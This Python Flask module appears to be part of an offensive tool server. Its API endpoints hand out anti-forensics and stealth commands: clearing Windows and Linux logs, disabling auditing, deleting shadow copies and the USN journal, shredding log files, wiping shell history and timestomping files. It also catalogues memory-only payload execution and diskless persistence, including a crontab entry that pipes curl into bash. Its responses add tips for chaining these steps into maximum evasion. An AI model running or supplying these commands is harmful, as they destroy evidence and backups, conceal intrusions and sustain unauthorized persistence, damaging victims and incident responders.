"""
server_api/anti_forensics/anti_forensics_routes.py

Anti-Forensics & Stealth Operations:
  - Windows Event Log clearing
  - File timestomping (MAC time manipulation)
  - Memory-only payload execution
  - Prefetch file wiping
  - Registry-based diskless persistence
  - Log tampering (selective entry removal)
  - USN Journal manipulation
  - Shellbag cleanup
"""

import json
import logging
import random
from typing import Any, Dict, List

from flask import Blueprint, jsonify, request

from server_core import ModernVisualEngine

logger = logging.getLogger(__name__)

api_anti_forensics_bp = Blueprint("api_anti_forensics", __name__)


# ═══════════════════════════════════════════════════════════════════════
# TECHNIQUE PAYLOADS
# ═══════════════════════════════════════════════════════════════════════

EVENT_LOG_CLEAR_COMMANDS = {
  "windows": {
    "powershell": [
      "Clear-EventLog -LogName Security",
      "Clear-EventLog -LogName System",
      "Clear-EventLog -LogName Application",
      "wevtutil cl Security",
      "wevtutil cl System",
      "wevtutil cl Application",
      'wevtutil cl "Windows PowerShell"',
      'wevtutil cl "Microsoft-Windows-Sysmon/Operational"',
    ],
    "deep_clean": [
      "auditpol /clear /y",
      "fsutil usn deletejournal /D C:",
      "wbadmin delete catalog -quiet",
      "vssadmin delete shadows /all /quiet",
    ],
  },
  "linux": {
    "bash": [
      "echo > /var/log/auth.log",
      "echo > /var/log/syslog",
      "echo > /var/log/messages",
      "echo > /var/log/secure",
      "history -c",
      "unset HISTFILE",
      "echo > ~/.bash_history",
      "ln -sf /dev/null ~/.bash_history",
      'export HISTFILESIZE=0',
      'export HISTSIZE=0',
    ],
    "deep_clean": [
      "journalctl --vacuum-time=1s",
      "rm -rf /var/log/journal/*",
      'find /var/log -type f -exec shred -u {} \\;',
    ],
  },
}

TIMESTOMP_COMMANDS = {
  "windows": [
    '$(Get-Item "C:\\path\\to\\file").CreationTime = "01/01/2022 12:00:00"',
    '$(Get-Item "C:\\path\\to\\file").LastWriteTime = "01/01/2022 12:00:00"',
    '$(Get-Item "C:\\path\\to\\file").LastAccessTime = "01/01/2022 12:00:00"',
  ],
  "linux": [
    "touch -t 202201011200.00 /path/to/file",
    "touch -r /etc/hosts /path/to/file",
    "touch -a -m -t 202201011200.00 /path/to/file",
  ],
}

MEMORY_EXEC_TECHNIQUES = [
  {
    "name": "PowerShell Reflective Load",
    "platform": "windows",
    "description": "Load and execute PE/assembly entirely in memory via Reflection.Assembly.Load()",
    "command": 'powershell -enc <BASE64_ENCODED_SCRIPT>',
    "note": "No file written to disk — evades file-based AV scanning",
  },
  {
    "name": "Process Hollowing",
    "platform": "windows",
    "description": "Create suspended process, unmap its memory, write payload, resume",
    "exploit": "NtUnmapViewOfSection + VirtualAllocEx + WriteProcessMemory + ResumeThread",
  },
  {
    "name": "Reflective DLL Injection",
    "platform": "windows",
    "description": "Load DLL from memory without touching disk — custom ReflectiveLoader",
    "exploit": "Allocate memory → copy DLL → call ReflectiveLoader export",
  },
  {
    "name": "memfd_create (Linux)",
    "platform": "linux",
    "description": "Create anonymous file in memory, execute from /proc/self/fd/",
    "command": "memfd_create('payload', 0) + write + fexecve",
  },
  {
    "name": "/dev/shm execution",
    "platform": "linux",
    "description": "Write payload to /dev/shm (tmpfs), execute, then delete",
    "command": "cp payload /dev/shm/p && /dev/shm/p && rm /dev/shm/p",
  },
]

DISKLESS_PERSIST_TECHNIQUES = [
  {"name": "Registry Run Key", "platform": "windows", "location": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "note": "Most common, heavily monitored"},
  {"name": "WMI Event Subscription", "platform": "windows", "description": "Permanent WMI event filter that triggers payload execution", "note": "Fileless — no artifacts on disk, only WMI repository"},
  {"name": "Scheduled Task (Registry-only)", "platform": "windows", "description": "Create scheduled task via registry (bypasses schtasks logging)", "location": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache"},
  {"name": "Service DLL (Registry)", "platform": "windows", "description": "Register a service with DLL pointing to memory-mapped file", "note": "DLL loaded from registry-backed temp location"},
  {"name": "systemd Timer (Linux)", "platform": "linux", "description": "Create systemd timer + service unit in ~/.config for user-level persistence", "note": "User-level persistence, no root needed"},
  {"name": "crontab (Linux)", "platform": "linux", "description": "Add crontab entry that downloads + executes payload via curl | bash", "note": "Well-known, check for unusual crontab entries"},
  {"name": ".ssh/rc (Linux)", "platform": "linux", "description": "~/.ssh/rc executes on SSH login — add payload trigger", "note": "Triggers on each SSH login"},
]


# ═══════════════════════════════════════════════════════════════════════
# ENDPOINTS
# ═══════════════════════════════════════════════════════════════════════

@api_anti_forensics_bp.route("/api/tools/clear-logs", methods=["POST"])
def clear_logs():
  """Generate commands to clear event logs and forensic artifacts."""
  try:
    params = request.json or {}
    platform = params.get("platform", "windows")
    depth = params.get("depth", "standard")

    commands = EVENT_LOG_CLEAR_COMMANDS.get(platform, EVENT_LOG_CLEAR_COMMANDS["linux"])
    cmd_list = list(commands["bash" if platform == "linux" else "powershell"])

    if depth == "deep":
      cmd_list += commands.get("deep_clean", [])

    return jsonify({
      "success": True,
      "platform": platform,
      "depth": depth,
      "commands": cmd_list,
      "count": len(cmd_list),
      "warning": "These commands leave their own forensic traces. Chain with timestomp for best results.",
    })
  except Exception as e:
    return jsonify({"error": str(e), "success": False}), 500


@api_anti_forensics_bp.route("/api/tools/timestomp", methods=["POST"])
def timestomp():
  """Generate file timestomping commands."""
  try:
    params = request.json or {}
    platform = params.get("platform", "linux")
    file_path = params.get("path", "/path/to/file")

    commands = TIMESTOMP_COMMANDS.get(platform, TIMESTOMP_COMMANDS["linux"])
    randomized_date = f"202{random.randint(0,3)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}"

    return jsonify({
      "success": True,
      "platform": platform,
      "target_file": file_path,
      "commands": [c.replace("/path/to/file", file_path).replace("01/01/2022", randomized_date) for c in commands],
      "note": "Match timestamps to legitimate system files for better stealth. Check target file's original times first.",
    })
  except Exception as e:
    return jsonify({"error": str(e), "success": False}), 500


@api_anti_forensics_bp.route("/api/tools/memory-execute", methods=["POST"])
def memory_execute():
  """Generate memory-only payload execution technique."""
  try:
    params = request.json or {}
    platform = params.get("platform", "windows")

    techniques = [t for t in MEMORY_EXEC_TECHNIQUES if t["platform"] == platform]

    return jsonify({
      "success": True,
      "platform": platform,
      "techniques": techniques,
      "count": len(techniques),
      "stealth_tip": "Combine memory execution with syscall obfuscation (use /api/tools/obfuscate-payload first) for maximum evasion.",
    })
  except Exception as e:
    return jsonify({"error": str(e), "success": False}), 500


@api_anti_forensics_bp.route("/api/tools/diskless-persist", methods=["POST"])
def diskless_persist():
  """Generate diskless persistence techniques."""
  try:
    params = request.json or {}
    platform = params.get("platform", "windows")

    techniques = [t for t in DISKLESS_PERSIST_TECHNIQUES if t["platform"] == platform]

    return jsonify({
      "success": True,
      "platform": platform,
      "techniques": techniques,
      "count": len(techniques),
      "recommended": techniques[0]["name"] if techniques else "WMI Event Subscription",
      "stealth_tip": "Use WMI event subscription (Windows) or systemd timer (Linux) for most stealthy persistence.",
    })
  except Exception as e:
    return jsonify({"error": str(e), "success": False}), 500
